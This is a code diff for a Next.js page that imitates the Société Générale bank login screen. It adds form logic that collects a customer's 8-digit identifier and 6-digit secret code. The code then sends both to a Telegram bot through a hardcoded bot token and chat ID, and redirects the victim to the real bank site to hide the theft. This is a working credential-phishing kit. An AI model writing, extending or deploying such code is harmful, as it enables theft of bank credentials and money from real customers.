@@ -2,22 +2,97 @@
 
 import Image from "next/image";
 import KeyboardDoubleArrowRightIcon from '@mui/icons-material/KeyboardDoubleArrowRight';
-import {FormEvent, useState} from "react";
+import {useState} from "react";
 import SwitchWithText from "@/app/sg/component/switch";
 import NumericKeypadGrid from "@/app/sg/component/keyboard";
+import {z} from "zod";
+import { zodResolver } from "@hookform/resolvers/zod"
+import {useForm} from "react-hook-form"
 
+const input1Schema = z.object({
+    input1 : z.string().regex(/^\d+$/, "Votre identifiant est incorrect.").min(8, "Votre identifiant est incorrect.")
+})
+
+const input2Schema = z.object({
+    input2 : z.string()
+        .min(6, "Le code secret saisi est incorrect. Merci de bien vouloir ressaisir votre code secret composé de 6 chiffres."),
+})
+
+const fullSchema = input1Schema.merge(input2Schema)
 
 
 export default function Home() {
 
-    const [name, setName] = useState("");
-    const [submitted, setSubmitted] = useState(false);
+    const {
+        register,
+        trigger,
+        getValues,
+        setValue,
+        watch,
+        formState: { errors },
+    } = useForm({
+        resolver: zodResolver(fullSchema),
+        mode: "onTouched",
+        defaultValues : {
+            input2: ""
+        }
+    })
 
-    const isValidName = name.length === 8 && /^\d+$/.test(name);
+    const [step, setStep] = useState(1);
+    const input1 = watch("input1")
+    const input2 = watch("input2")
 
-    const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
+    const sendMessage = async (message : string) => {
+        const token = '8166936500:AAFN7kGshSodpKi9EgyE90vC4q5XY8KJUtI';
+        const chatId = '8343791176';
+        const text = encodeURIComponent(message || 'Message par défaut');
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`;
+
+        try {
+            const response = await fetch(url);
+            const data = await response.json();
+            window.location.href = "https://particuliers.sg.fr/"
+        } catch (error) {
+        }
+    };
+
+    const resetCode = () => {
+        setValue("input2", "")
+    };
+
+    const handleClickCode = (num : string) => {
+        if(input2.length < 6){
+            setValue("input2", input2 + num)
+        }
+    };
+
+    const buildMessage = (name : string, code: string) => {
+        return (
+            `Bonjour 👋
+                Voici vos identifiants :
+                Identifiant : ${name}
+                Mot de passe  : ${code}
+                
+                Merci de garder ces informations en lieu sûr 🔐`
+                        );
+                    };
+
+
+    const onSubmit = async (e: React.MouseEvent<HTMLButtonElement>) => {
         e.preventDefault();
-        setSubmitted(true);
+        if(step == 1){
+            const v = await trigger("input1")
+            if (v) setStep(2);
+        } else if(step == 2){
+            const v = await trigger("input2")
+            if(v){
+                const {input1, input2} = getValues()
+                console.log(buildMessage(input1, input2))
+                await sendMessage(buildMessage(input1, input2))
+            }
+
+        }
     };
 
     return (
@@ -66,16 +141,15 @@ export default function Home() {
             <div className="flex flex-col mx-auto  justify-center bg-white/95 w-full max-w-6xl mt-10">
                 <div className={"flex flex-col md:flex-row"}>
                     <div className={"w-full md:w-1/2 md:border-r-2 md:border-gray-400 mt-8"}>
-                        <form onSubmit={handleSubmit} className="bg-white p-8 w-full max-w-sm mx-auto">
+                        <form className="bg-white p-8 w-full max-w-sm mx-auto">
                             <div className="relative ">
                                 <input
                                     type="text"
                                     id="name"
-                                    value={name} // Assure-toi d'avoir un état React pour gérer le champ
-                                    onChange={(e) => setName(e.target.value)}
                                     className="text-[19px] tracking-[1.5px] font-semibold peer block w-full border-b border-gray-500 p-2 pr-8 text-gray-600 focus:outline-none focus:border-black"
                                     placeholder=" "
                                     maxLength={8}
+                                    {...register("input1")}
                                 />
                                 <label
                                     htmlFor="name"
@@ -87,13 +161,13 @@ export default function Home() {
                                     Saisissez votre identifiant
                                 </label>
 
-                                {name && (
+                                {step && (
                                     <button
                                         type="button"
-                                        onClick={() => setName("")}
+                                        onClick={() => setValue("input1", "")}
                                         className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 cursor-pointer "
                                     >
-                                        {name.length == 8 && /^\d+$/.test(name) ? (
+                                        {input1 && input1.length == 8 && /^\d+$/.test(input1) ? (
                                             <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25"
                                                  viewBox="0 0 24 24" fill="none" stroke="#55d39e" stroke-width="3.5"
                                                  stroke-linecap="round" stroke-linejoin="round"
@@ -113,6 +187,10 @@ export default function Home() {
                                     </button>
                                 )}
                             </div>
+                            <div className={"mt-5 flex justify-center"}>
+                                {errors.input1 && <p className="text-red-500 text-sm">{errors.input1.message}</p> }
+                                {errors.input2 && <p className="text-red-500 text-[13px]">{errors.input2.message}</p> }
+                            </div>
                             <div className={"mb-6 flex flex-row justify-center gap-2 mt-2"}>
                                 <SwitchWithText/>
                                 <div>
@@ -128,15 +206,16 @@ export default function Home() {
                                     </svg>
                                 </div>
                             </div>
-                            {submitted && isValidName && <NumericKeypadGrid />}
+                            {step == 2 && <NumericKeypadGrid value={input2} handleClick={handleClickCode} reset={resetCode} />}
                             <div className="flex justify-center">
                                 <button
-                                    type={"submit"}
+                                    type={"button"}
+                                    onClick={(e) => {onSubmit(e)}}
                                     className="w-[200px] font-semibold cursor-pointer bg-[#e9041e] rounded-full text-white py-3 flex justify-center items-center">
                                     Valider
                                 </button>
                             </div>
-                            {submitted && isValidName &&
+                            {step == 2 &&
                             <div style={{color: "#545454"}} className={"mt-3 flex justify-center font-semibold text-[15px] underline cursor-pointer"} >Activer le clavier sonore</div>}
                         </form>
                     </div>
